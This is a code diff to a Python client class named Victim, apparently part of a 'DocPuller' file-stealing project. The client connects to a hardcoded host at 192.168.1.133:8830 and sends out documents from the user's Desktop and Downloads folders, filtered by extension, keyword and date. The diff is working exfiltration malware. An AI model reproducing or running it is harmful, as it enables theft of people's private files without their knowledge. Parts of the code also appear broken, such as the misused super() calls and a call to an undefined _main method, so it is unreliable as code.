@@ -4,15 +4,26 @@ import os
 import socket
 
 from real.DocPullerScripts.DocPullerFTP.protocol import Protocol
+from real.DocPullerScripts.DocPullerGenric import DocPuller
 
 
-class Victim(Protocol):
+class Victim(DocPuller, Protocol):
 
-    def __init__(self, server, port):
-        super().__init__(server, port)
+    def __init__(self, server, port, directorys, file_types, key_words, date):
+        super(DocPuller).__init__(directorys, file_types, key_words, date)
+        super(Protocol).__init__(server, port)
         self.victim = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-    def start(self):
+    def _pull_files(self):
+        while self._running or not self._pull_files_queue.empty():
+            if not self._pull_files_queue.empty():
+                file_name = self._pull_files_queue.get().split('\\')[-1]
+                with open(file_name, 'rb') as f:
+                    file_data = f.read()
+                file_name = file_name.encode()
+                self.send_file(self.victim, file_name, file_data)
+
+    def main(self):
         try:
             self.victim.connect(self.ADDR)
         except Exception as e:
@@ -20,18 +31,12 @@ class Victim(Protocol):
 
         connected = True
         if connected:
-            os.chdir(f'/Users/{os.getlogin()}/Desktop')
-            for file in os.listdir():
-                if os.path.isfile(file):
-                    with open(file, 'rb') as f:
-                        data = f.read()
-                    self.send_file(self.victim, file.encode(), data)
-                    print('----------------------------------------')
-                    print('sending', file)
-            connected = False
+            self._main()
         self.victim.close()
         print('done.')
 
 
 if __name__ == '__main__':
-    Victim(1, 1).start()
+    Victim('192.168.1.133', 8830,
+           ('Desktop', 'Downloads'), ('.pdf', '.doc'), ('test', 'math'), {'2023': ('06', '05',)}
+           ).main()
